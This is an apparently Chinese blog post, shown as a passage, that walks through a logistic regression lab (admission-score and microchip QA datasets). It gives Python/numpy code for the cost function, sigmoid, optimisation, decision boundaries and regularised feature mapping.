              <time title="Created: 2022-05-08 01:32:49" itemprop="dateCreated datePublished" datetime="2022-05-08T01:32:49+08:00">2022-05-08</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-10-10 00:08:02" itemprop="dateModified" datetime="2022-10-10T00:08:02+08:00">2022-10-10</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/AI/" itemprop="url" rel="index"><span itemprop="name">AI</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>9.1k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>8 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="实验介绍"><a href="#实验介绍" class="headerlink" title="实验介绍"></a>实验介绍</h2><p>在本练习中，您将实现逻辑回归，并将其应用于两个不同的数据集</p>
<p>实验文件：</p>
<ul>
<li>ex2.m：Octave/MATLAB脚本，帮助您完成练习</li>
<li>ex2_reg.m：m-Octave/MATLAB脚本，用于练习的后续部分</li>
<li>ex2data1.txt：txt-练习前半部分的训练集</li>
<li>ex2data2.txt：txt-练习后半部分的训练集</li>
<li>submit.m：将您的解决方案发送到我们的服务器</li>
<li>mapFeature.m：生成多项式特征的m函数</li>
<li>plotDecisionBoundary.m：绘制分类器决策界的函数</li>
<li>[?] plotData.m：绘制二维分类数据的函数</li>
<li>[?] sigmoid.m：Sigmoid函数（平滑的阶梯函数）</li>
<li>[?] costFunction.m：逻辑代价成本函数</li>
<li>[?] predict.m：逻辑回归预测函数</li>
<li>[?] costFunctionReg.m：正则化逻辑回归代价函数</li>
</ul>
<h2 id="Logistic-Regression（逻辑回归）"><a href="#Logistic-Regression（逻辑回归）" class="headerlink" title="Logistic Regression（逻辑回归）"></a>Logistic Regression（逻辑回归）</h2><p>在这部分练习中，你将建立一个逻辑回归模型来预测学生是否被大学录取：</p>
<ul>
<li>假设你是一所大学的系主任，你想根据两次考试的结果来确定每个申请人的入学机会，你有以前申请者的历史数据，可以用作逻辑回归的训练集</li>
<li>对于每个培训示例，您都有申请人的两次考试成绩和录取决定</li>
<li>你的任务是建立一个分类模型，根据这两次考试的分数来估计申请人的入学概率</li>
</ul>
<p>这是一个典型的监督分类问题，学生只有录取和不录取两种可能，而我们需要评估这两种可能的概率</p>
<h2 id="Visualizing-the-data-A（可视化数据）"><a href="#Visualizing-the-data-A（可视化数据）" class="headerlink" title="Visualizing the data A（可视化数据）"></a>Visualizing the data A（可视化数据）</h2><p>在开始实施任何学习算法之前，如果可能，最好将数据可视化，将加载数据，并通过调用函数 plotData 将其显示在二维绘图上</p>
<p>先看看 plotData 函数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">plot_data</span>(<span class="params">X,Y</span>):</span></span><br><span class="line">    <span class="comment"># 用两种不同的颜色，在同一张图像上，绘制两个类别的数据散点图</span></span><br><span class="line">	plt.figure();</span><br><span class="line">	pos = Y == <span class="number">1</span> <span class="comment"># 如果&quot;Y==1&quot;成立,pos为True,否则为False</span></span><br><span class="line">	neg = Y == <span class="number">0</span> <span class="comment"># 如果&quot;Y==0&quot;成立,neg为True,否则为False</span></span><br><span class="line">	plt.scatter(X[neg,<span class="number">0</span>],X[neg,<span class="number">1</span>],c=<span class="string">&#x27;black&#x27;</span>,marker=<span class="string">&#x27;o&#x27;</span>,s=<span class="number">20</span>) <span class="comment"># 不合格为&quot;black&quot;</span></span><br><span class="line">	plt.scatter(X[pos,<span class="number">0</span>],X[pos,<span class="number">1</span>],c=<span class="string">&#x27;red&#x27;</span>,marker=<span class="string">&#x27;o&#x27;</span>,s=<span class="number">20</span>) <span class="comment"># 合格为&quot;red&quot;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>scatter：设置图表上的断点</li>
<li>注意：只有对应的 “neg” “pos” 为 True 时，才会被导入 scatter </li>
</ul>
<p>具体实现：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt <span class="comment"># 与图像操作有关的库(提供了和MATLAB类似的绘图API)</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np <span class="comment"># 支持大量的维度数组与矩阵运算,此外也针对数组运算提供大量的数学函数库</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ====== 1.读取数据并绘制散点图 ======</span></span><br><span class="line">dataset = np.loadtxt(<span class="string">&#x27;data\ex2data1.txt&#x27;</span>,delimiter =<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">X = dataset[:,<span class="number">0</span>:<span class="number">2</span>] <span class="comment"># 第一/二列: 第一/二次考试的成绩</span></span><br><span class="line">Y = dataset[:,<span class="number">2</span>] <span class="comment"># 第三列: 是否合格(&#x27;1&#x27;表示合格,&#x27;0&#x27;表示不合格)</span></span><br><span class="line"></span><br><span class="line">plot_data(X,Y) <span class="comment"># 图像处理函数(主要是散点的处理)</span></span><br><span class="line">plt.legend([<span class="string">&#x27;Admitted&#x27;</span>, <span class="string">&#x27;Not admitted&#x27;</span>])</span><br><span class="line">plt.xlabel(<span class="string">&#x27;Exam 1 score&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;Exam 2 score&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<img src="/2022/05/08/Machine-Learning-Lab2/1651918030002-1652006204970.png" class width="1651918030002"> 
<p>通过观察图像：决策边界（Decision Boundary）就是一条直线（不需要在特征中添加格外的多项式）</p>
<h2 id="Cost-function-and-gradient-A（代价函数与梯度）"><a href="#Cost-function-and-gradient-A（代价函数与梯度）" class="headerlink" title="Cost function and gradient A（代价函数与梯度）"></a>Cost function and gradient A（代价函数与梯度）</h2><p>现在，您将实现逻辑回归的代价函数和梯度下降，在 costFunction 中完成代码，返回代价和梯度</p>
<p>逻辑回归的代价函数为<strong>交叉熵</strong>，公式如下：</p>
<script type="math/tex; mode=display">
J(θ)=\frac1{m}\sum_{i=1}^mCost(h_θ(x^{(i)}),y^{(i)})
=-\frac1{m}[\sum_{i=1}^my^{(i)}log\,h_θ(x^{(i)})+(1-y^{(i)})log(1-h_θ(x^{(i)}))]</script><p>costFunction 函数的实现：（这里已经是带有正则的形式了，但只要 lmd 为“0”就没有影响）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> sigmoid <span class="keyword">import</span> sigmoid</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cost_Function_Reg</span>(<span class="params">X,Y,theta,lmd</span>):</span></span><br><span class="line">    <span class="comment"># 计算代价和梯度</span></span><br><span class="line">	m = X.shape[<span class="number">0</span>]</span><br><span class="line">	Z = np.dot(X,theta)</span><br><span class="line">	g = sigmoid(Z) <span class="comment"># Sigmoid函数(假设陈述)</span></span><br><span class="line"></span><br><span class="line">	cost = - (Y.T).dot(np.log(g)) - ((<span class="number">1</span>-Y).T).dot(np.log(<span class="number">1</span>-g))</span><br><span class="line">	cost = cost /(m) + lmd * (theta.T).dot(theta) / (<span class="number">2</span>*m)</span><br><span class="line">	grad = (X.T).dot(g-Y.reshape(Y.size))/ m</span><br><span class="line">	grad[<span class="number">0</span>] = grad[<span class="number">0</span>]</span><br><span class="line">	grad[<span class="number">1</span>:] = grad[<span class="number">1</span>:] + (lmd * theta[<span class="number">1</span>:])/m</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> cost,grad</span><br></pre></td></tr></table></figure>
<ul>
<li>array.T：二维数组转置</li>
<li>dot(x , y)：两个数组作矩阵乘积，当两个数组的维度不能直接进行矩阵乘法时，dot会把尝试后面的参数进行转置</li>
</ul>
<p>这个 sigmoid 就是“假设陈述”：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sigmoid</span>(<span class="params">z</span>):</span></span><br><span class="line">	g = <span class="number">1</span>/(<span class="number">1</span>+np.exp(-z)) </span><br><span class="line">	<span class="keyword">return</span> g</span><br></pre></td></tr></table></figure>
<ul>
<li>exp(z)：求“e的z次方”</li>
</ul>
<p>整个式子就相当于：（标准的 Sigmoid 函数）</p>
<script type="math/tex; mode=display">
g(z)=\frac1{1+e^{-z}}</script><p>实现主体：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ====== 2.计算代价和梯度 ======</span></span><br><span class="line">(m,n) = X.shape</span><br><span class="line">X = np.c_[np.ones(m),X]	<span class="comment"># 添加偏置维度</span></span><br><span class="line">init_theta = np.zeros(X.shape[<span class="number">1</span>]) <span class="comment"># 初始化theta值</span></span><br><span class="line">lmd = <span class="number">0</span> <span class="comment"># 初始化lambda值(使其为&#x27;0&#x27;,排除正则化的影响)</span></span><br><span class="line">cost,grad = cf.cost_Function_Reg(X,Y,init_theta,lmd) <span class="comment"># 计算代价和梯度</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Cost at initial theta (zeros): &#123;:0.3f&#125;&#x27;</span>.<span class="built_in">format</span>(cost))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Expected cost (approx): 0.693&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Gradient at initial theta (zeros): \n&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(grad))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Expected gradients (approx): \n-0.1000\n-12.0092\n-11.2628&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用非0的theta测试函数</span></span><br><span class="line">test_theta = np.array([-<span class="number">24</span>,<span class="number">0.2</span>,<span class="number">0.2</span>]) <span class="comment"># 生成的是列向量</span></span><br><span class="line">cost, grad = cf.cost_Function_Reg(X,Y,test_theta,<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Cost at test theta (zeros): &#123;:0.3f&#125;&#x27;</span>.<span class="built_in">format</span>(cost))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Expected cost (approx): 0.218&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Gradient at test theta: \n&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(grad))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Expected gradients (approx): 0.043, 2.566, 2.647&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="Learning-parameters-using-fminunc-A（学习使用fminunc）"><a href="#Learning-parameters-using-fminunc-A（学习使用fminunc）" class="headerlink" title="Learning parameters using fminunc A（学习使用fminunc）"></a>Learning parameters using fminunc A（学习使用fminunc）</h2><p>在上一个作业中，您通过实现梯度下降找到了线性回归模型的最佳参数：你写了一个代价函数，计算了它的梯度，然后相应地进行了梯度下降</p>
<p>这一次，您将使用一个名为 fminunc 的函数，而不是采用梯度下降步骤</p>
<ul>
<li>Octave/MATLAB 的 fminunc 是一个优化解算器，可以找到无约束函数的最小值，对于逻辑回归，需要优化成本函数 J(θ)，具体来说，您将使用 fminunc 找到最佳参数 θ 对于逻辑回归成本函数 J(θ)</li>
</ul>
<p>实现如下：（使用 fminunc 进行拟合）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scipy.optimize <span class="keyword">as</span> opt <span class="comment"># SciPy的optimize模块提供了常用的最优化算法函数实现</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ======= 3.使用优化函数来优化求解 ========</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cost_func</span>(<span class="params">t</span>):</span></span><br><span class="line">	<span class="keyword">return</span> cf.cost_Function_Reg(X,Y,t,<span class="number">0</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">grad_func</span>(<span class="params">t</span>):</span></span><br><span class="line">	<span class="keyword">return</span> cf.cost_Function_Reg(X,Y,t,<span class="number">0</span>)[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">theta, cost, *unused = opt.fmin_bfgs(f=cost_func, fprime=grad_func, x0=init_theta, maxiter=<span class="number">400</span>, full_output=<span class="literal">True</span>, disp=<span class="literal">False</span>) <span class="comment"># fminunc函数</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Cost at theta found by fmin: &#123;:0.3f&#125;&#x27;</span>.<span class="built_in">format</span>(cost)) <span class="comment"># 可以发现:计算出的cost会小很多(优化效果好)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Expected cost (approx): 0.203&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;theta: \n&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(theta))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Expected Theta (approx): \n-25.161\n0.206\n0.201&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用计算出的theta来绘制分界线</span></span><br><span class="line">pdb.plot_Decision_Boundary(X,Y,theta)</span><br><span class="line">plt.xlabel(<span class="string">&#x27;Exam 1 score&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;Exam 2 score&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<p>效果如下：</p>
<img src="/2022/05/08/Machine-Learning-Lab2/1651930558787-1652006204970.png" class width="1651930558787"> 
<p>最后看一下 plot_Decision_Boundary 的实现：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">plot_Decision_Boundary</span>(<span class="params">X,Y,theta</span>):</span></span><br><span class="line">	plot_data(X[:,<span class="number">1</span>:<span class="number">3</span>],Y)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> X.shape[<span class="number">1</span>] &lt;= <span class="number">3</span>:</span><br><span class="line">		plot_x = np.array([np.<span class="built_in">min</span>(X[:,<span class="number">1</span>])-<span class="number">2</span>,np.<span class="built_in">max</span>(X[:,<span class="number">1</span>])+<span class="number">2</span>])</span><br><span class="line">		plot_y = (-<span class="number">1</span>/theta[<span class="number">2</span>]) * (theta[<span class="number">1</span>]*plot_x + theta[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">		plt.plot(plot_x,plot_y)</span><br><span class="line">		plt.legend([<span class="string">&#x27;Decision Boundary&#x27;</span>, <span class="string">&#x27;Admitted&#x27;</span>, <span class="string">&#x27;Not admitted&#x27;</span>]) <span class="comment"># legend:创建图例</span></span><br><span class="line">		plt.axis([<span class="number">30</span>,<span class="number">100</span>,<span class="number">30</span>,<span class="number">100</span>]) <span class="comment"># 做x,y轴[30,100]</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		u = np.linspace(-<span class="number">1</span>,<span class="number">1.5</span>,<span class="number">50</span>) <span class="comment"># linspace:线性空间中以均匀步长生成数字序列</span></span><br><span class="line">		v = np.linspace(-<span class="number">1</span>,<span class="number">1.5</span>,<span class="number">50</span>)</span><br><span class="line">		z = np.zeros((u.size,v.size)) <span class="comment"># zeros:返回来一个给定形状和类型的,用&#x27;0&#x27;填充的数组</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,u.size):</span><br><span class="line">			<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,v.size):</span><br><span class="line">				z[i,j] = np.dot(map_feature(u[i],v[j],<span class="number">6</span>),theta,)</span><br><span class="line"></span><br><span class="line">		z = z.T</span><br><span class="line">		cs = plt.contour(u,v,z,level=[<span class="number">0</span>],colors=<span class="string">&#x27;b&#x27;</span>,label=<span class="string">&#x27;Decision Boundary&#x27;</span>)</span><br><span class="line">		plt.legend([cs.collections[<span class="number">0</span>]], [<span class="string">&#x27;Decision Boundary&#x27;</span>])</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">map_feature</span>(<span class="params">x1,x2,power</span>):</span></span><br><span class="line">	x1 = x1.reshape((x1.size,<span class="number">1</span>)) <span class="comment"># reshape:给数组一个新的形状而不改变其数据</span></span><br><span class="line">	x2 = x2.reshape((x2.size,<span class="number">1</span>))</span><br><span class="line">	result = np.ones(x1[:,<span class="number">0</span>].shape) <span class="comment"># ones:返回给定形状和数据类型的新数组</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,power+<span class="number">1</span>):</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,i+<span class="number">1</span>):</span><br><span class="line">			result = np.c_[result,(x1**(i-j))*(x2**j)] <span class="comment"># c_[x,y]:按列叠加两个矩阵,把两个矩阵左右组合,要求行数相等</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>
<h2 id="Evaluating-logistic-regression（评估逻辑回归）"><a href="#Evaluating-logistic-regression（评估逻辑回归）" class="headerlink" title="Evaluating logistic regression（评估逻辑回归）"></a>Evaluating logistic regression（评估逻辑回归）</h2><p>在学习了这些参数之后，您可以使用该模型来预测某个特定的学生是否会被录取：</p>
<ul>
<li>对于一次考试成绩为45分、二次考试成绩为85分的学生，你应该预计入学概率为0.776</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sigmoid <span class="keyword">import</span> sigmoid</span><br><span class="line"><span class="keyword">from</span> predict <span class="keyword">import</span> predict</span><br><span class="line"></span><br><span class="line"><span class="comment"># ====== 4.预测和计算准确率 ======</span></span><br><span class="line">prob = sigmoid(np.array([<span class="number">1</span>, <span class="number">45</span>, <span class="number">85</span>]).T.dot(theta)) <span class="comment"># Sigmoid函数(假设陈述)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;For a student with scores 45 and 85, we predict an admission probability of &#123;:0.4f&#125;&#x27;</span>.<span class="built_in">format</span>(prob))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Expected value : 0.775 +/- 0.002&#x27;</span>)</span><br><span class="line"></span><br><span class="line">P = predict(X,theta) <span class="comment"># 计算模型的精度(把预测值和真实值进行对比)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Train accuracy:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(np.mean(P == Y)*<span class="number">100</span>)) <span class="comment"># mean:求取平均值</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Expected accuracy (approx): 89.0&#x27;</span>) <span class="comment"># 预期精度:89.0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">predict</span>(<span class="params">X,theta</span>):</span></span><br><span class="line">	P = sigmoid(X.dot(theta))</span><br><span class="line">	P[P&gt;=<span class="number">0.5</span>] = <span class="number">1</span></span><br><span class="line">	P[P&lt;<span class="number">0.5</span>] = <span class="number">0</span></span><br><span class="line">	<span class="keyword">return</span> P</span><br></pre></td></tr></table></figure>
<h2 id="Regularized-Logistic-Regression（正则逻辑回归）"><a href="#Regularized-Logistic-Regression（正则逻辑回归）" class="headerlink" title="Regularized Logistic Regression（正则逻辑回归）"></a>Regularized Logistic Regression（正则逻辑回归）</h2><p>在本部分练习中，您将实施正则化逻辑回归，以预测制造厂的微芯片是否通过质量保证（QA）</p>
<p>在QA过程中，每个微芯片都要经过各种测试，以确保其功能正常：</p>
<ul>
<li>假设你是工厂的产品经理，你有一些微芯片在两次测试中的测试结果</li>
<li>从这两个测试中，您可以确定是否应该接受或拒绝微芯片</li>
<li>为了帮助你做出决定，你有一个关于过去微芯片测试结果的数据集，从中你可以建立一个逻辑回归模型</li>
</ul>
<h2 id="Visualizing-the-data-B（可视化数据）"><a href="#Visualizing-the-data-B（可视化数据）" class="headerlink" title="Visualizing the data B（可视化数据）"></a>Visualizing the data B（可视化数据）</h2><p>与本练习的前几部分类似，plotData 用于生成图形：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ====== 1.读取数据 ======</span></span><br><span class="line">data = np.loadtxt(<span class="string">&#x27;data\ex2data2.txt&#x27;</span>, delimiter=<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">X = data[:, <span class="number">0</span>:<span class="number">2</span>] <span class="comment"># 第一/二列: 第一/二次的测试分数</span></span><br><span class="line">y = data[:, <span class="number">2</span>] <span class="comment"># 第三列: 是否合格(&#x27;1&#x27;表示合格,&#x27;0&#x27;表示不合格)</span></span><br><span class="line"></span><br><span class="line">plot_data(X, y) <span class="comment"># 图像处理函数(主要是散点的处理)</span></span><br><span class="line"></span><br><span class="line">plt.xlabel(<span class="string">&#x27;Microchip Test 1&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;Microchip Test 2&#x27;</span>)</span><br><span class="line">plt.legend([<span class="string">&#x27;y = 1&#x27;</span>, <span class="string">&#x27;y = 0&#x27;</span>])</span><br><span class="line">plt.show()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<img src="/2022/05/08/Machine-Learning-Lab2/1651930775922-1652006204970.png" class width="1651930775922"> 
<p>可以发现：大概是一个二次的模型</p>
<ul>
<li>如果参数θ过少，代价函数就会过大（欠拟合）</li>
<li>如果参数θ过多，代价函数足够小了，但是泛化能力下降（过拟合）</li>
</ul>
<p>所以考虑使用正则来平衡过拟合的影响</p>
<h2 id="Feature-mapping（特征映射）"><a href="#Feature-mapping（特征映射）" class="headerlink" title="Feature mapping（特征映射）"></a>Feature mapping（特征映射）</h2><p>更好地拟合数据的方法是从每个数据点创建更多特征</p>
<ul>
<li>在提供的函数 mapFeature 中：我们将把这些特征映射成x1和x2的所有多项式项，直到六次方</li>
</ul>
<img src="/2022/05/08/Machine-Learning-Lab2/1651930930274-1652006204970.png" class width="1651930930274"> 
<ul>
<li>作为这种映射的结果，我们的两个特征向量（两次QA测试的分数）已转换为28维向量</li>
<li>在这个高维特征向量上训练的逻辑回归分类器将具有更复杂的决策边界，并且在我们的二维图中绘制时将呈现非线性</li>
<li>虽然特征映射允许我们构建更具表现力的分类器，但它也更容易过度拟合</li>
<li>在本练习的下一部分中，您将实施正则化逻辑回归来拟合数据，并亲自了解正则化如何帮助解决过度拟合问题</li>
</ul>
<h2 id="Cost-function-and-gradient-B（代价函数与梯度）"><a href="#Cost-function-and-gradient-B（代价函数与梯度）" class="headerlink" title="Cost function and gradient B（代价函数与梯度）"></a>Cost function and gradient B（代价函数与梯度）</h2><p>现在，您将实现用于计算正则逻辑回归的代价函数和梯度的代码：完成 costFunctionReg 中的代码，返回成本和梯度</p>
<p>正则化交叉熵公式：</p>
<script type="math/tex; mode=display">
J(θ)=-\frac1{m}[\sum_{i=1}^my^{(i)}log\,h_θ(x^{(i)})+(1-y^{(i)})log(1-h_θ(x^{(i)}))+\frac{λ}{2m}\sum_{j=1}^nθ_j^{2}]</script><p>实现如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> costFunction <span class="keyword">import</span> cost_Function_Reg </span><br><span class="line"></span><br><span class="line"><span class="comment"># ====== 2.投影到高维，计算带正则项的代价和梯度 ======</span></span><br><span class="line">X = mf.map_feature(X[:, <span class="number">0</span>], X[:, <span class="number">1</span>],<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(X.shape)</span><br><span class="line">initial_theta = np.zeros(X.shape[<span class="number">1</span>]) <span class="comment"># 初始化拟合参数θ</span></span><br><span class="line">lmd = <span class="number">1</span> <span class="comment"># 将正则化参数lambda设置为1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算并显示正则逻辑回归的初始成本和梯度</span></span><br><span class="line">cost, grad = cost_Function_Reg (X, y,initial_theta, lmd)</span><br><span class="line"></span><br><span class="line">np.set_printoptions(formatter=&#123;<span class="string">&#x27;float&#x27;</span>: <span class="string">&#x27;&#123;: 0.4f&#125;\n&#x27;</span>.<span class="built_in">format</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Cost at initial theta (zeros): &#123;: 0.4f&#125;&#x27;</span>.<span class="built_in">format</span>(cost))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Expected cost (approx): 0.693&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Gradient at initial theta (zeros) - first five values only: \n&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(grad[<span class="number">0</span>:<span class="number">5</span>]))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Expected gradients (approx) - first five values only: \n 0.0085\n 0.0188\n 0.0001\n 0.0503\n 0.0115&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="Learning-parameters-using-fminunc-B（学习使用fminunc）"><a href="#Learning-parameters-using-fminunc-B（学习使用fminunc）" class="headerlink" title="Learning parameters using fminunc B（学习使用fminunc）"></a>Learning parameters using fminunc B（学习使用fminunc）</h2><p>这个和上一个板块的区别不大，只要设置 λ 非零就好了：</p>
